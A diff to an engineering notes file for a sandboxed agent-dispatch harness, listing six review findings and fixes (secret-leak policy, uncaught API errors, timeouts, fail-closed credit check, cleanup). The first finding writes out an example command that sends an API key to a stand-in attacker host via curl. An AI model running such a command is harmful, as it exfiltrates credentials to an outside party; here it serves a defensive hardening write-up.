@@ -84,3 +84,46 @@ primitive, which already worked and isn't the thing that was broken.
   race on, so there's no reason to expect it behaves differently at N>1, but
   that's an inference, not a demonstrated result -- worth an explicit test
   with 3+ rows once there's more to dispatch.
+
+## Skeptic round 1 (purely theoretical, no live testing) -- 6 issues found and fixed
+
+1. **No explicit `--on-secret-violation`.** `msb run --help` documents no
+   default for what happens when a secret leaks to a disallowed host, so a
+   model-run `curl evil.com?k=$OPENROUTER_API_KEY` could exfiltrate the live
+   key on whatever the undocumented default turns out to be. Now set
+   explicitly to `block-and-terminate`.
+2. **Non-`HTTPError` exceptions and HTTP-200-with-embedded-error bodies were
+   uncaught.** A transient `URLError`/timeout crashed the whole process with
+   no `VERIFIED_GREEN`/`VERIFY_FAILED`/`FATAL:` marker at all, which the host
+   side would then silently read as a plain RED with no explanation. Worse:
+   OpenRouter can return HTTP 200 with an `{"error": ...}` body for some
+   upstream failures (including some out-of-credit conditions), which used
+   to crash on an unhandled `KeyError` reading `choices[0]` -- silently
+   reintroducing the exact "look like a normal failure, actually an account
+   problem" bug this rewrite exists to fix. Both are now caught and
+   classified explicitly before the response is trusted.
+3. **The outer timeout couldn't fit the real workload.** `verify()`'s own
+   ceiling is 1800s per call, but the *whole* agent_loop.py invocation (every
+   retry, every turn, every verify) was ALSO wrapped in `timeout 1800` on the
+   host side -- one cold-cache verify pass could consume the entire budget
+   before a second retry ever got a chance, making the retry-cap silently
+   unreachable on real (Rust/LLVM) work. Now a separate, generous
+   `--overall-timeout` (default 5400s) sized to fit multiple verify passes
+   with real slack, not rounded up from a single one.
+4. **The credit preflight failed OPEN on its own errors.** Any exception
+   other than a clean HTTP error (a network blip, DNS failure) let dispatch
+   proceed with an unknown balance -- a softer version of the exact bug this
+   check exists to prevent. Now fails CLOSED: refuses to dispatch on an
+   inconclusive check rather than guessing.
+5. **`workdir` (and everything in it besides the already-removed clone) was
+   never cleaned up** -- a permanent per-dispatch directory leak, the same
+   disk-fill shape as the old harness's worktree-target-dir incident. Patches
+   now get written into `RESULT_DIR` and the whole `workdir` is removed
+   unconditionally in the `finally` block.
+6. **No timeout on the `git clone`/`fetch`/`checkout` calls**, unlike every
+   `msb` call. A network stall there hung the worker thread -- and that row's
+   lock -- indefinitely with no recovery path. Now timed out explicitly.
+
+All six fixed in code and re-verified locally (tool functions, lock
+exclusion, and the concurrent-dispatch-with-one-crash test all still pass
+after the changes).
